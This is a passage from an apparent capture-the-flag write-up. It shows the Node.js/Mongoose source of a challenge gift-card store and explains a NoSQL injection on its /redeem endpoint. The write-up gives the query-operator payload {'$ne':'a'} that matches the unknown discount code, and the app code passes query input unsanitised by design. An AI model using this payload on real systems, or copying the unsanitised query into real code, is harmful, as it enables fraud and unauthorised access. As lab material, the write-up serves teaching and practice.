        <span class="nx">product</span> <span class="o">=</span> <span class="kc">null</span>
        <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">p</span> <span class="k">of</span> <span class="nx">all</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span><span class="p">(</span><span class="nx">p</span><span class="p">.</span><span class="nx">productId</span> <span class="o">===</span> <span class="nx">productId</span><span class="p">){</span>
                <span class="nx">product</span> <span class="o">=</span> <span class="nx">p</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">product</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">next</span><span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Product not found.</span><span class="dl">'</span> <span class="p">});</span>
        <span class="p">}</span>

        <span class="c1">// Parse the product cost into a numeric value</span>
        <span class="kd">let</span> <span class="nx">productCost</span> <span class="o">=</span> <span class="nf">parseCost</span><span class="p">(</span><span class="nx">product</span><span class="p">.</span><span class="nx">Cost</span><span class="p">);</span>  

        <span class="k">if </span><span class="p">(</span><span class="nf">isNaN</span><span class="p">(</span><span class="nx">productCost</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">next</span><span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Invalid product cost format.</span><span class="dl">'</span> <span class="p">});</span>
        <span class="p">}</span>

        <span class="c1">// Fetch the authenticated user</span>
        <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nf">findById</span><span class="p">(</span><span class="nx">req</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">userId</span><span class="p">);</span>

        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nf">next</span><span class="p">({</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">User not found.</span><span class="dl">'</span> <span class="p">});</span>
        <span class="p">}</span>

        <span class="c1">// Check if the user can afford the product</span>
        <span class="k">if </span><span class="p">(</span><span class="nx">user</span><span class="p">.</span><span class="nx">Balance</span> <span class="o">&gt;=</span> <span class="nx">productCost</span><span class="p">)</span> <span class="p">{</span>
            <span class="c1">// Generate a UUID v4 as a transaction ID</span>
            <span class="kd">const</span> <span class="nx">transactionId</span> <span class="o">=</span> <span class="nf">uuidv4</span><span class="p">();</span>
            
            <span class="c1">// Deduct the product cost and save the user</span>
            <span class="nx">user</span><span class="p">.</span><span class="nx">Balance</span> <span class="o">-=</span> <span class="nx">productCost</span><span class="p">;</span>
            <span class="k">await</span> <span class="nx">user</span><span class="p">.</span><span class="nf">save</span><span class="p">();</span>

            <span class="c1">// Create a new UserProduct entry</span>
            <span class="kd">const</span> <span class="nx">userProduct</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">UserProducts</span><span class="p">({</span>
                <span class="na">transactionId</span><span class="p">:</span> <span class="nx">transactionId</span><span class="p">,</span>
                <span class="na">user</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">_id</span><span class="p">,</span>
                <span class="na">productId</span><span class="p">:</span> <span class="nx">product</span><span class="p">.</span><span class="nx">_id</span><span class="p">,</span> <span class="c1">// Reference the product purchased</span>
            <span class="p">});</span>

            <span class="k">await</span> <span class="nx">userProduct</span><span class="p">.</span><span class="nf">save</span><span class="p">();</span> <span class="c1">// Save the UserProduct entry</span>

            <span class="c1">// Add the UserProduct reference to the user's ownedproducts array</span>
            <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">user</span><span class="p">.</span><span class="nx">ownedproducts</span><span class="p">.</span><span class="nf">includes</span><span class="p">(</span><span class="nx">userProduct</span><span class="p">.</span><span class="nx">_id</span><span class="p">))</span> <span class="p">{</span>
                <span class="nx">user</span><span class="p">.</span><span class="nx">ownedproducts</span><span class="p">.</span><span class="nf">push</span><span class="p">(</span><span class="nx">userProduct</span><span class="p">.</span><span class="nx">_id</span><span class="p">);</span>
                <span class="k">await</span> <span class="nx">user</span><span class="p">.</span><span class="nf">save</span><span class="p">();</span> <span class="c1">// Save the updated user</span>
            <span class="p">}</span>

            <span class="c1">// Prepare the response data</span>
            <span class="kd">const</span> <span class="nx">responseData</span> <span class="o">=</span> <span class="p">{</span>
                <span class="na">success</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
                <span class="na">message</span><span class="p">:</span> <span class="s2">`Product correctly bought! Remaining balance: </span><span class="p">${</span><span class="nx">user</span><span class="p">.</span><span class="nx">Balance</span><span class="p">}</span><span class="s2">`</span><span class="p">,</span>
                <span class="na">product</span><span class="p">:</span> <span class="p">{</span>
                    <span class="na">Name</span><span class="p">:</span> <span class="nx">product</span><span class="p">.</span><span class="nx">Name</span><span class="p">,</span>
                    <span class="na">Description</span><span class="p">:</span> <span class="nx">product</span><span class="p">.</span><span class="nx">Description</span><span class="p">,</span>
                <span class="p">},</span>
            <span class="p">};</span>
            <span class="k">if </span><span class="p">(</span><span class="nx">product</span><span class="p">.</span><span class="nx">productId</span> <span class="o">===</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
                <span class="nx">responseData</span><span class="p">.</span><span class="nx">product</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">=</span> <span class="nx">product</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">||</span> <span class="dl">'</span><span class="s1">No flag available</span><span class="dl">'</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">(</span><span class="nx">responseData</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Insufficient balance to purchase this product.</span><span class="dl">'</span> <span class="p">});</span>
        <span class="p">}</span>
    <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error during product payment:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">error</span><span class="p">);</span>
        <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">json</span><span class="p">({</span><span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">An error occurred during product payment.</span><span class="dl">'</span> <span class="p">});</span>
    <span class="p">}</span>
<span class="p">});</span>

<span class="nx">router</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">passport</span><span class="p">.</span><span class="nf">authenticate</span><span class="p">(</span><span class="dl">'</span><span class="s1">jwt</span><span class="dl">'</span><span class="p">,</span> <span class="k">async </span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">r</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
        <span class="kd">let</span> <span class="p">{</span> <span class="nx">userId</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">r</span>
        <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">userId</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">home</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
                <span class="na">Authenticated</span><span class="p">:</span> <span class="kc">false</span>
            <span class="p">})</span>
        <span class="p">}</span>

        <span class="k">try</span> <span class="p">{</span>
            <span class="c1">// Fetch the user and populate the ownedproducts, which are UserProducts</span>
            <span class="kd">const</span> <span class="nx">user</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">User</span><span class="p">.</span><span class="nf">findById</span><span class="p">(</span><span class="nx">userId</span><span class="p">)</span>
                <span class="p">.</span><span class="nf">populate</span><span class="p">({</span>
                    <span class="na">path</span><span class="p">:</span> <span class="dl">'</span><span class="s1">ownedproducts</span><span class="dl">'</span><span class="p">,</span> <span class="c1">// Populate the UserProducts</span>
                    <span class="na">populate</span><span class="p">:</span> <span class="p">{</span>
                        <span class="na">path</span><span class="p">:</span> <span class="dl">'</span><span class="s1">productId</span><span class="dl">'</span><span class="p">,</span> <span class="c1">// Populate the product details</span>
                        <span class="na">model</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Product</span><span class="dl">'</span> <span class="c1">// The model to fetch the product details</span>
                    <span class="p">}</span>
                <span class="p">})</span>
                <span class="p">.</span><span class="nf">exec</span><span class="p">()</span>

            <span class="c1">// Map the owned products with product details and transactionId</span>
            <span class="kd">const</span> <span class="nx">ownedproducts</span> <span class="o">=</span> <span class="nx">user</span><span class="p">.</span><span class="nx">ownedproducts</span><span class="p">.</span><span class="nf">map</span><span class="p">((</span><span class="nx">userProduct</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
                <span class="kd">const</span> <span class="nx">product</span> <span class="o">=</span> <span class="nx">userProduct</span><span class="p">.</span><span class="nx">productId</span><span class="p">;</span> <span class="c1">// Access the populated product details</span>
                <span class="k">return</span> <span class="p">{</span>
                    <span class="na">Name</span><span class="p">:</span> <span class="nx">product</span><span class="p">.</span><span class="nx">Name</span><span class="p">,</span>           <span class="c1">// Name of the product</span>
                    <span class="na">Description</span><span class="p">:</span> <span class="nx">product</span><span class="p">.</span><span class="nx">Description</span><span class="p">,</span> <span class="c1">// Description of the product</span>
                    <span class="na">Cost</span><span class="p">:</span> <span class="nx">product</span><span class="p">.</span><span class="nx">Cost</span><span class="p">,</span>             <span class="c1">// Cost of the product</span>
                    <span class="na">FLAG</span><span class="p">:</span> <span class="nx">product</span><span class="p">.</span><span class="nx">FLAG</span> <span class="o">||</span> <span class="kc">null</span><span class="p">,</span>      <span class="c1">// Flag (only exists for certain products)</span>
                    <span class="na">transactionId</span><span class="p">:</span> <span class="nx">userProduct</span><span class="p">.</span><span class="nx">transactionId</span> <span class="c1">// Add transactionId here</span>
                <span class="p">}</span>
            <span class="p">})</span>

            <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">home</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span>
                <span class="na">Authenticated</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
                <span class="na">username</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">username</span><span class="p">,</span>
                <span class="na">Balance</span><span class="p">:</span> <span class="nx">user</span><span class="p">.</span><span class="nx">Balance</span><span class="p">,</span>  <span class="c1">// Pass balance as a variable to the template</span>
                <span class="na">ownedproducts</span><span class="p">:</span> <span class="nx">ownedproducts</span> <span class="c1">// Pass the products with transactionId</span>
            <span class="p">})</span>
        <span class="p">}</span> <span class="k">catch </span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
            <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">'</span><span class="s1">Error fetching user or products:</span><span class="dl">'</span><span class="p">,</span> <span class="nx">err</span><span class="p">)</span>
            <span class="k">return</span> <span class="nf">next</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="c1">// Handle any errors (e.g., database issues)</span>
        <span class="p">}</span>
    <span class="p">})(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span>
<span class="p">})</span>

<span class="nx">router</span><span class="p">.</span><span class="nf">use</span><span class="p">((</span><span class="nx">err</span><span class="p">,</span> <span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">,</span> <span class="nx">next</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="nx">res</span><span class="p">.</span><span class="nf">status</span><span class="p">(</span><span class="nx">err</span><span class="p">.</span><span class="nx">status</span> <span class="o">||</span> <span class="mi">400</span><span class="p">).</span><span class="nf">json</span><span class="p">({</span>
        <span class="na">success</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
        <span class="na">error</span><span class="p">:</span> <span class="nx">err</span><span class="p">.</span><span class="nx">message</span> <span class="o">||</span> <span class="dl">'</span><span class="s1">Invalid Request</span><span class="dl">'</span><span class="p">,</span>
    <span class="p">})</span>
<span class="p">})</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">router</span>
</pre></td></tr></tbody></table></code></div>  </div>

</details>
<p><span style="padding-top: 10px;"></span></p>
<h6 id="models"><strong>Models</strong></h6>
<details id="seedjs">
  <summary>discountCode.js</summary>
  <div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">mongoose</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongoose</span><span class="dl">'</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">DiscountCodeSchema</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nc">Schema</span><span class="p">({</span>
    <span class="na">discountCode</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
        <span class="na">default</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="c1">// Optional field for discount codes</span>
    <span class="p">},</span>
    <span class="na">value</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">Number</span><span class="p">,</span>
        <span class="na">default</span><span class="p">:</span> <span class="mi">10</span>
    <span class="p">}</span>
<span class="p">})</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nf">model</span><span class="p">(</span><span class="dl">'</span><span class="s1">DiscountCodes</span><span class="dl">'</span><span class="p">,</span> <span class="nx">DiscountCodeSchema</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div>  </div>
</details>

<details id="seedjs">
  <summary>userproduct.js</summary>
  <div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">mongoose</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongoose</span><span class="dl">'</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">UserProductsSchema</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nc">Schema</span><span class="p">({</span>
    <span class="na">transactionId</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
        <span class="na">required</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="na">unique</span><span class="p">:</span> <span class="kc">true</span> <span class="c1">// Ensure the transaction ID is unique</span>
    <span class="p">},</span>
    <span class="na">user</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nx">Schema</span><span class="p">.</span><span class="nx">Types</span><span class="p">.</span><span class="nx">ObjectId</span><span class="p">,</span>
        <span class="na">ref</span><span class="p">:</span> <span class="dl">'</span><span class="s1">User</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">required</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="na">productId</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nx">Schema</span><span class="p">.</span><span class="nx">Types</span><span class="p">.</span><span class="nx">ObjectId</span><span class="p">,</span>
        <span class="na">ref</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Product</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">required</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="na">createdAt</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">Date</span><span class="p">,</span>
        <span class="na">default</span><span class="p">:</span> <span class="nb">Date</span><span class="p">.</span><span class="nx">now</span> <span class="c1">// Automatically store when the user buys the product</span>
    <span class="p">},</span>
    <span class="na">discountCode</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nx">Schema</span><span class="p">.</span><span class="nx">Types</span><span class="p">.</span><span class="nx">ObjectId</span><span class="p">,</span>
        <span class="na">ref</span><span class="p">:</span> <span class="dl">'</span><span class="s1">DiscountCodes</span><span class="dl">'</span><span class="p">,</span>
        <span class="na">default</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="c1">// Optional field for discount codes</span>
    <span class="p">},</span>
<span class="p">})</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nf">model</span><span class="p">(</span><span class="dl">'</span><span class="s1">UserProducts</span><span class="dl">'</span><span class="p">,</span> <span class="nx">UserProductsSchema</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div>  </div>
</details>

<details id="seedjs">
  <summary>user.js</summary>
  <div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">mongoose</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongoose</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">passportLocalMongoose</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">passport-local-mongoose</span><span class="dl">'</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">userSchema</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nc">Schema</span><span class="p">({</span>
    <span class="na">username</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
        <span class="na">required</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="na">unique</span><span class="p">:</span> <span class="kc">true</span> <span class="c1">// Ensuring the username is unique</span>
    <span class="p">},</span>
    <span class="na">passwd</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">String</span>
    <span class="p">},</span>
    <span class="na">Balance</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">Number</span><span class="p">,</span>
        <span class="na">default</span><span class="p">:</span> <span class="mi">0</span>
    <span class="p">},</span>
    <span class="na">lastVoucherRedemption</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">Date</span><span class="p">,</span>
        <span class="na">default</span><span class="p">:</span> <span class="kc">null</span>
    <span class="p">},</span>
    <span class="na">ownedproducts</span><span class="p">:</span> <span class="p">[{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nx">Schema</span><span class="p">.</span><span class="nx">Types</span><span class="p">.</span><span class="nx">ObjectId</span><span class="p">,</span>
        <span class="na">ref</span><span class="p">:</span> <span class="dl">'</span><span class="s1">UserProducts</span><span class="dl">'</span>
    <span class="p">}]</span>
<span class="p">})</span>

<span class="nx">userSchema</span><span class="p">.</span><span class="nf">plugin</span><span class="p">(</span><span class="nx">passportLocalMongoose</span><span class="p">,</span> <span class="p">{</span>
    <span class="na">session</span><span class="p">:</span> <span class="kc">false</span>
<span class="p">})</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nf">model</span><span class="p">(</span><span class="dl">'</span><span class="s1">User</span><span class="dl">'</span><span class="p">,</span> <span class="nx">userSchema</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div>  </div>
</details>

<details id="seedjs">
  <summary>product.js</summary>
  <div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">mongoose</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">mongoose</span><span class="dl">'</span><span class="p">)</span>

<span class="kd">const</span> <span class="nx">productSchema</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nc">Schema</span><span class="p">({</span>
    <span class="na">productId</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">Number</span><span class="p">,</span>
        <span class="na">required</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="na">unique</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="na">Name</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
        <span class="na">required</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="na">unique</span><span class="p">:</span> <span class="kc">true</span>
    <span class="p">},</span>
    <span class="na">Description</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
        <span class="na">required</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="na">default</span><span class="p">:</span> <span class="dl">''</span>
    <span class="p">},</span>
    <span class="na">Cost</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">String</span><span class="p">,</span>
        <span class="na">required</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
        <span class="na">default</span><span class="p">:</span> <span class="dl">'</span><span class="s1">15 Points</span><span class="dl">'</span>
    <span class="p">},</span>
    <span class="na">FLAG</span><span class="p">:</span> <span class="p">{</span>
        <span class="na">type</span><span class="p">:</span> <span class="nb">String</span>
    <span class="p">}</span>
<span class="p">})</span>

<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">mongoose</span><span class="p">.</span><span class="nf">model</span><span class="p">(</span><span class="dl">'</span><span class="s1">Product</span><span class="dl">'</span><span class="p">,</span> <span class="nx">productSchema</span><span class="p">)</span>

</pre></td></tr></tbody></table></code></div>  </div>
</details>

<h3 id="interesting-points"><span class="me-2">Interesting Points</span><a href="#interesting-points" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Basically:</p>

<ul>
  <li>The goal is to get <code class="language-plaintext highlighter-rouge">50 credits</code> to purchase the flag in the store.</li>
  <li>The <strong>only way</strong> to earn money is to <strong>redeem a gift card</strong></li>
  <li>there is only <code class="language-plaintext highlighter-rouge">ONE</code> gift card, with a <strong>randomly generated</strong> ID</li>
  <li>The gift card can only be redeemed <strong>once per day</strong>.</li>
</ul>

<p>That means that we need to find a way to redeem a giftcard with an ID that we don’t have, multiple times. Seems impossible right ?</p>

<h3 id="identifying-vulnerabilities"><span class="me-2">Identifying vulnerabilities</span><a href="#identifying-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>Fortunately there are several vulnerabilities in this code. First there is a <a href="https://portswigger.net/web-security/nosql-injection">NoSQL injection</a> on the <code class="language-plaintext highlighter-rouge">/redeem</code> endpoint, which could potentially allow us to <strong>redeem the giftcard without knowing its randomly-generated ID</strong>:</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="c1">// Now handle the DiscountCode (Gift Card)</span>
<span class="kd">let</span> <span class="p">{</span> <span class="nx">discountCode</span> <span class="p">}</span> <span class="o">=</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">;</span>

<span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">discountCode</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">error</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span> <span class="na">Authenticated</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">message</span><span class="p">:</span> <span class="dl">'</span><span class="s1">Discount code is required!</span><span class="dl">'</span> <span class="p">});</span>
<span class="p">}</span>

<span class="kd">const</span> <span class="nx">discount</span> <span class="o">=</span> <span class="k">await</span> <span class="nx">DiscountCodes</span><span class="p">.</span><span class="nf">findOne</span><span class="p">({</span><span class="nx">discountCode</span><span class="p">})</span>
</pre></td></tr></tbody></table></code></div></div>

<p><code class="language-plaintext highlighter-rouge">discountCode</code> is a <code class="language-plaintext highlighter-rouge">GET</code> parameter taken from the URL and directly passed to the <code class="language-plaintext highlighter-rouge">findOne</code> function <em>(from <a href="https://mongoosejs.com/docs/guide.html">mongoose</a>)</em> without any sanitization. After reading  <a href="https://mongoosejs.com/docs/queries.html">this</a> and <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">this</a>, I realized I just need to send this json object through the url:</p>

<div class="language-json highlighter-rouge"><div class="code-header">
        <span data-label-text="JSON"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nl">"discountCode"</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="w">
    </span><span class="nl">"$ne"</span><span class="p">:</span><span class="w"> </span><span class="s2">"a"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>MongoDB will look for all discount codes where the ID is <strong>not equal</strong> to <code class="language-plaintext highlighter-rouge">a</code>. We know from the <a href="#appjs">app.js</a> that:</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">generateDiscountCode</span> <span class="o">=</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span>
    <span class="kd">const</span> <span class="nx">characters</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</span><span class="dl">'</span><span class="p">;</span>
    <span class="kd">let</span> <span class="nx">discountCode</span> <span class="o">=</span> <span class="dl">''</span><span class="p">;</span>
    <span class="k">for </span><span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">12</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">discountCode</span> <span class="o">+=</span> <span class="nx">characters</span><span class="p">.</span><span class="nf">charAt</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">floor</span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nf">random</span><span class="p">()</span> <span class="o">*</span> <span class="nx">characters</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nx">discountCode</span><span class="p">;</span>
<span class="p">};</span>
